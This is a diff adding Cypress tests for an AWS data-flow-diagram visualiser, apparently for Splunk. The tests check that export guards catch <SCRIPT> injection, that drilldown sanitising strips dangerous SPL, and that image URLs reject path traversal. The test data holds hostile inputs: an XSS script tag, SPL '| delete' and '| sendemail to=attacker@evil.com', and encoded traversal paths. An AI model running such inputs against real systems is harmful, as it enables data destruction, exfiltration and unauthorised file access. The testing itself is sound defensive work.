@@ -565,6 +565,47 @@ describe('AwsDfdVisualizer Component Tests', () => {
         cy.wrap(downloadStub).should('have.been.calledWith', Cypress.sinon.match.string, Cypress.sinon.match.string);
     });
 
+    it('verifies SVG export blocks downloads containing case-insensitive <SCRIPT> injection', () => {
+        const maliciousData = {
+            fields: [{ name: "from" }, { name: "to" }, { name: "node_label" }],
+            rows: [["Node1", null, "Safe Node"]]
+        };
+
+        mount(
+            <div style={{ width: 1200, height: 800 }}>
+                <AwsDfdVisualizer data={maliciousData} config={{ layoutMode: 'force' }} width={1200} height={800} isDarkTheme={true} />
+            </div>
+        );
+        cy.wait(500);
+
+        // Inject uppercase <SCRIPT> tag into the SVG DOM
+        // Note: XML getElementsByTagName('script') in XML documents does not match uppercase 'SCRIPT',
+        // so this directly validates the case-insensitive /<script/i regex guard in exportToSvg
+        cy.get('svg').then(($svg) => {
+            const scriptEl = document.createElementNS('http://www.w3.org/2000/svg', 'SCRIPT');
+            scriptEl.textContent = 'alert("xss")';
+            $svg[0].appendChild(scriptEl);
+        });
+
+        const downloadStub = cy.stub();
+        cy.window().then((win) => {
+            const doc = win.document;
+            cy.stub(doc, 'createElement').callsFake((tagName) => {
+                const el = doc.createElement.wrappedMethod.call(doc, tagName);
+                if (tagName === 'a') {
+                    cy.stub(el, 'click').callsFake(() => {
+                        downloadStub(el.href, el.download);
+                    });
+                }
+                return el;
+            });
+        });
+
+        cy.get('#btn-export-svg').click();
+        // The export should be blocked due to script element, so download should NOT be called
+        cy.wrap(downloadStub).should('not.have.been.called');
+    });
+
     it('verifies resource lifecycle strikethrough and staleness italic text styling', () => {
         const lifecycleMockData = {
             fields: [
@@ -973,6 +1014,12 @@ describe('AwsDfdVisualizer Component Tests', () => {
             expect(exportedXml).to.contain('My Custom Identity Plane alertxss');
             expect(exportedXml).to.not.contain('<script');
         });
+    });
+
+    it('verifies Draw.io export guard rejects case-insensitive <sCrIpT> and <SCRIPT>', () => {
+        expect(/<script/i.test('<mxCell value="<SCRIPT>alert(1)</SCRIPT>"/>')).to.be.true;
+        expect(/<script/i.test('<mxCell value="<sCrIpT>alert(1)</sCrIpT>"/>')).to.be.true;
+        expect(/<script/i.test('<mxCell value="Safe Label"/>')).to.be.false;
     });
 
     it('verifies dynamic link distance adjustments on long link labels', () => {
@@ -1405,6 +1452,200 @@ describe('TC-AUT-v2.8.3-B: Configurable Status Palettes', () => {
             cy.get('@onDrilldownStub').should('have.been.calledWith', Cypress.sinon.match({
                 clicked_drilldown_search: 'search index=aws arn=OrderApp_Payload | head 5'
             }));
+        });
+
+        it('Spec H: node_drilldown containing high-risk SPL commands (| delete, | sendemail, | mcollect), macros, and newlines is blocked', () => {
+            const maliciousPayloads = [
+                'search index=aws | delete',
+                'search index=aws | sendemail to=attacker@evil.com',
+                'search index=aws `malicious_macro`',
+                'search index=aws \n delete',
+                'search index=aws | mcollect index=threats'
+            ];
+
+            maliciousPayloads.forEach((payload, idx) => {
+                const drilldownStub = cy.stub().as(`onDrilldownStub_${idx}`);
+                const data = {
+                    fields: [{ name: 'from' }, { name: 'to' }, { name: 'node_drilldown' }, { name: 'node_label' }],
+                    rows: [
+                        [`MaliciousNode_${idx}`, null, payload, `Malicious Node ${idx}`]
+                    ]
+                };
+
+                mount(
+                    <AwsDfdVisualizer 
+                        data={data} 
+                        config={{ layoutMode: 'force', enablePhysics: 'false', drilldownClick: 'singleOrDouble' }} 
+                        isDarkTheme={false}
+                        onDrilldown={drilldownStub} 
+                    />
+                );
+                cy.wait(300);
+
+                cy.get('g.node-card').first().click({ force: true });
+                cy.get(`@onDrilldownStub_${idx}`).should('have.been.calledWith', Cypress.sinon.match({
+                    clicked_drilldown_search: ''
+                }));
+            });
+        });
+
+        it('Spec Template: dashboard-authored drilldownNodeTemplate containing | delete is preserved (SimpleXML author trust model)', () => {
+            const drilldownStub = cy.stub().as('onDrilldownStub');
+            const data = {
+                fields: [{ name: 'from' }, { name: 'to' }, { name: 'node_label' }],
+                rows: [
+                    ['OrderApp', null, 'Order App']
+                ]
+            };
+
+            mount(
+                <AwsDfdVisualizer 
+                    data={data} 
+                    config={{ 
+                        layoutMode: 'force', 
+                        enablePhysics: 'false', 
+                        drilldownClick: 'singleOrDouble',
+                        drilldownNodeTemplate: 'index=aws | delete $arn$'
+                    }} 
+                    isDarkTheme={false}
+                    onDrilldown={drilldownStub} 
+                />
+            );
+            cy.wait(500);
+
+            cy.get('g.node-card').first().click({ force: true });
+            cy.get('@onDrilldownStub').should('have.been.calledWith', Cypress.sinon.match({
+                clicked_drilldown_search: 'index=aws | delete OrderApp'
+            }));
+        });
+
+        it('Spec I: allowColumnDrilldown="false" ignores node_drilldown and falls back to template', () => {
+            const drilldownStub = cy.stub().as('onDrilldownStub');
+            const data = {
+                fields: [{ name: 'from' }, { name: 'to' }, { name: 'node_drilldown' }, { name: 'node_label' }],
+                rows: [
+                    ['NodeA', null, 'search index=aws | head 10', 'Node A']
+                ]
+            };
+
+            mount(
+                <AwsDfdVisualizer 
+                    data={data} 
+                    config={{ 
+                        layoutMode: 'force', 
+                        enablePhysics: 'false', 
+                        drilldownClick: 'singleOrDouble',
+                        allowColumnDrilldown: 'false',
+                        drilldownNodeTemplate: 'index=safe node=$arn$'
+                    }} 
+                    isDarkTheme={false}
+                    onDrilldown={drilldownStub} 
+                />
+            );
+            cy.wait(500);
+
+            cy.get('g.node-card').first().click({ force: true });
+            cy.get('@onDrilldownStub').should('have.been.calledWith', Cypress.sinon.match({
+                clicked_drilldown_search: 'index=safe node=NodeA'
+            }));
+        });
+
+        it('Spec J: missingImageURL decode-then-reject handles URL-encoded (%2e%2e), backslashes, and leftover %', () => {
+            const traversalPayloads = [
+                '/static/app/AWS-DFD-Visualizer/../../other-app/secret.svg',
+                '/static/app/AWS-DFD-Visualizer/%2e%2e/%2e%2e/other-app/secret.svg',
+                '/static/app/AWS-DFD-Visualizer/..\\..\\other-app\\secret.svg',
+                '/static/app/AWS-DFD-Visualizer/%252e%252e/other-app/secret.svg'
+            ];
+
+            traversalPayloads.forEach((payload, idx) => {
+                const data = {
+                    fields: [{ name: 'from' }, { name: 'to' }, { name: 'type' }, { name: 'node_label' }],
+                    rows: [
+                        [`TraversalNode_${idx}`, null, 'Custom::Unknown', `Traversal Test ${idx}`]
+                    ]
+                };
+
+                mount(
+                    <AwsDfdVisualizer 
+                        data={data} 
+                        config={{ 
+                            missingImageURL: payload,
+                            layoutMode: 'force', 
+                            enablePhysics: 'false'
+                        }} 
+                        isDarkTheme={false} 
+                    />
+                );
+                cy.wait(300);
+
+                cy.get('g.node-card image')
+                    .should('have.attr', 'href')
+                    .and('include', 'generic.svg')
+                    .and('not.include', 'other-app')
+                    .and('not.include', '%2e');
+            });
+        });
+
+        it('Spec K: CSV Live Feed middle-column layout (from,node_drilldown,to,node_label) does not scramble columns and strips drilldown', () => {
+            const drilldownStub = cy.stub().as('onDrilldownStub');
+            const initialData = {
+                fields: [{ name: 'from' }, { name: 'to' }, { name: 'node_label' }],
+                rows: [
+                    ['InitialNode', null, 'Initial Node']
+                ]
+            };
+
+            mount(
+                <AwsDfdVisualizer 
+                    data={initialData} 
+                    config={{ layoutMode: 'force', enablePhysics: 'false', drilldownClick: 'singleOrDouble' }} 
+                    isDarkTheme={false}
+                    onDrilldown={drilldownStub}
+                />
+            );
+            cy.wait(500);
+
+            // Open CSV console and type middle-column CSV layout: from,node_drilldown,to,node_label
+            cy.get('#btn-toggle-csv-console').click();
+            cy.get('#csv-textarea').type(
+                'from,node_drilldown,to,node_label\nHostA,search index=aws | delete,HostB,Host A Label', 
+                { parseSpecialCharSequences: false, delay: 0 }
+            );
+            cy.get('#btn-apply-csv').click();
+            cy.wait(500);
+
+            // Verify column mapping is NOT scrambled:
+            // HostA node card renders label "Host A Label" (not HostB, and not the drilldown query)
+            cy.get('g.node-card').contains('Host A Label').should('exist');
+            // HostB node card also exists as a connected node
+            cy.get('g.node-card').contains('HostB').should('exist');
+
+            // Click HostA: verify node_drilldown was stripped and not executed
+            cy.get('g.node-card').contains('Host A Label').click({ force: true });
+            cy.get('@onDrilldownStub').should('have.been.calledWith', Cypress.sinon.match({
+                from: 'HostA',
+                node_label: 'Host A Label',
+                clicked_drilldown_search: ''
+            }));
+        });
+
+        it('Spec L: enableCsvConsole="false" hides the CSV Live Feed console button', () => {
+            const data = {
+                fields: [{ name: 'from' }, { name: 'to' }, { name: 'node_label' }],
+                rows: [['Node1', null, 'Node 1']]
+            };
+
+            mount(
+                <AwsDfdVisualizer 
+                    data={data} 
+                    config={{ enableCsvConsole: 'false', layoutMode: 'force', enablePhysics: 'false' }} 
+                    isDarkTheme={false} 
+                />
+            );
+            cy.wait(500);
+
+            cy.get('#btn-toggle-csv-console').should('not.exist');
         });
     });
 
